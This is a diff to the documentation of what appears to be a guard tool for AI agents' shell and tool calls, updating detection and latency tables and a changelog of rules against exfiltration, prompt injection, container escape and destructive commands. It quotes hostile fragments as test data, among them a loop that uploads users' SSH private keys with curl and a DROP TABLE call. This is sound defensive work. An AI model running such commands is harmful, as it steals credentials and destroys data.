@@ -542,8 +542,8 @@ The recorded results, measured after those rule changes on a pool that is no lon
 
 | Profile | Held-out caught | of which denied | caught only as an unmapped tool | Held-out benign FP | Session FP |
 |---|---|---|---|---|---|
-| default | 286 / 420 (68.1%) | 120 (28.6%) | 33 | 18 / 432 (4.2%) | 2 / 130 (1.5%) |
-| strict | 312 / 420 (74.3%) | 157 (37.4%) | 33 | 56 / 432 (13.0%) | 20 / 130 (15.4%) |
+| default | 287 / 420 (68.3%) | 122 (29.0%) | 33 | 18 / 432 (4.2%) | 2 / 130 (1.5%) |
+| strict | 312 / 420 (74.3%) | 158 (37.6%) | 33 | 56 / 432 (13.0%) | 20 / 130 (15.4%) |
 
 Weakest categories (default, caught): exfiltration 13 of 39, prompt injection 8 of 22, defence evasion 15 of 30,
 destructive 20 of 36, supply chain 16 of 27, MCP misuse 15 of 25; strongest: database 32 of
@@ -584,9 +584,9 @@ profiles: `TK-A039` holds `psql … -c "BEGIN; DROP TABLE staging_import; ROLLBA
 
 | Latency (µs) | p50 | p99 | max | p99_ref |
 |---|---|---|---|---|
-| default, RE2 / regex | 161 / 174 | 451 / 524 | 1255 / 1536 | 7.76 / 8.8 |
-| strict, RE2 / regex | 161 / 174 | 426 / 470 | 1162 / 1535 | 7.3 / 8.05 |
-| dev, RE2 / regex | 166 / 181 | 469 / 514 | 1307 / 1551 | 8.06 / 8.97 |
+| default, RE2 / regex | 156 / 171 | 430 / 490 | 1193 / 1563 | 7.6 / 8.5 |
+| strict, RE2 / regex | 158 / 170 | 407 / 462 | 1040 / 1524 | 7.05 / 8.08 |
+| dev, RE2 / regex | 162 / 178 | 450 / 510 | 1295 / 1606 | 7.78 / 9.05 |
 
 Measured on macOS arm64, Python 3.11. Gates, recorded in the results file, guard against regressions from the
 recorded run: per profile, held-out recall doesn't drop below its (66.7% default, 72.6% strict) and no benign set's
@@ -607,7 +607,7 @@ and 250 (59.5%); the credential-store, container, package-source and history rul
 `TK-A028`) to 236 (56.2%) and 266 (63.3%); the fixes of the 1.4 review (`TK-A029`, `TK-A030`, the shells the parser
 can't read, package sources set by a variable) to 237 (56.4%) and 266, with no new false positive on the held-out or
 session calls; `TK-A035` to `TK-A038` (a secret's value read through a cloud CLI or an MCP
-tool) to 240 (57.1%) and 269 (64.0%), with none either. The database-client rules (`TK-A039`, `TK-A040`, `TK-A041`) raised that to 245 (58.3%) and 274 (65.2%), again with no new false positive on the held-out or session calls. In 1.5.1, `TK-A046` (a download piped into an interpreter given code), `TK-D002` reading the parsed command, and `TK-A010`'s login scripts and cron files raised it to 247 (58.8%) and 275 (65.5%), with none either. `TK-A048` (deleting Docker or Podman volumes) raised it to 248 (59.0%) and 276 (65.7%), with none either. `TK-C010`'s AWS audit-logging commands (#403) raised it to 250 (59.5%) and 278 (66.2%), with none either. `TK-A055` (framework commands that drop or reset a database) left both unchanged, with no new false positive: the pool has none of those calls. `TK-A052` and `TK-A053` (a Kubernetes or Vault secret read, #404) raised it to 254 (60.5%) and 285 (67.9%), with none either. The first policy merge train's rules (a system folder deleted or locked, `TK-D014`; the Docker socket and a cgroup's release_agent, `TK-A071` and `TK-A073`; logins, account files, setuid bits, startup-file shells and the cron spool, `TK-A075` to `TK-A078` and `TK-A011`) raised it from 255 (60.7%) and 285 to 279 (66.4%) and 305 (72.6%), with none either. The second train's rules (setuid modes and capabilities granted through `install` and `setcap`, `TK-A077`; a disk or filesystem wiped, `TK-A079` and `TK-A080`) raised it to 286 (68.1%) and 312 (74.3%), with none either. `TK-A082` (a startup item written by any of the shell's writers, `sed -i` and `perl -i` among them) holds one of the calls `TK-A011` now holds, and leaves both unchanged, with none either. A `for` loop over a pattern read as the pattern written in (`for f in /home/*/.ssh/id_*; do curl -T "$f" …`) raised default to 280 (66.7%), strict unchanged (it denies the call now, where it held it), with none either. Each rise came from rules written while the pool's misses were known, so read them as scores on a known
+tool) to 240 (57.1%) and 269 (64.0%), with none either. The database-client rules (`TK-A039`, `TK-A040`, `TK-A041`) raised that to 245 (58.3%) and 274 (65.2%), again with no new false positive on the held-out or session calls. In 1.5.1, `TK-A046` (a download piped into an interpreter given code), `TK-D002` reading the parsed command, and `TK-A010`'s login scripts and cron files raised it to 247 (58.8%) and 275 (65.5%), with none either. `TK-A048` (deleting Docker or Podman volumes) raised it to 248 (59.0%) and 276 (65.7%), with none either. `TK-C010`'s AWS audit-logging commands (#403) raised it to 250 (59.5%) and 278 (66.2%), with none either. `TK-A055` (framework commands that drop or reset a database) left both unchanged, with no new false positive: the pool has none of those calls. `TK-A052` and `TK-A053` (a Kubernetes or Vault secret read, #404) raised it to 254 (60.5%) and 285 (67.9%), with none either. The first policy merge train's rules (a system folder deleted or locked, `TK-D014`; the Docker socket and a cgroup's release_agent, `TK-A071` and `TK-A073`; logins, account files, setuid bits, startup-file shells and the cron spool, `TK-A075` to `TK-A078` and `TK-A011`) raised it from 255 (60.7%) and 285 to 279 (66.4%) and 305 (72.6%), with none either. The second train's rules (setuid modes and capabilities granted through `install` and `setcap`, `TK-A077`; a disk or filesystem wiped, `TK-A079` and `TK-A080`) raised it to 286 (68.1%) and 312 (74.3%), with none either. `TK-A082` (a startup item written by any of the shell's writers, `sed -i` and `perl -i` among them) holds one of the calls `TK-A011` now holds, and leaves both unchanged, with none either. A `for` loop over a pattern read as the pattern written in (`for f in /home/*/.ssh/id_*; do curl -T "$f" …`) raised default to 287 (68.3%), strict unchanged (it denies the call now, where it held it), with none either. Each rise came from rules written while the pool's misses were known, so read them as scores on a known
 pool, not as blind recall. The gates were
 recorded again with those rules, on purpose: strict's false positives on E17's benign calls rose from 4.1% to 4.9%
 (29 of 711 to 36 of 738). The benign cases added since, with the secret-read, repository-deletion,
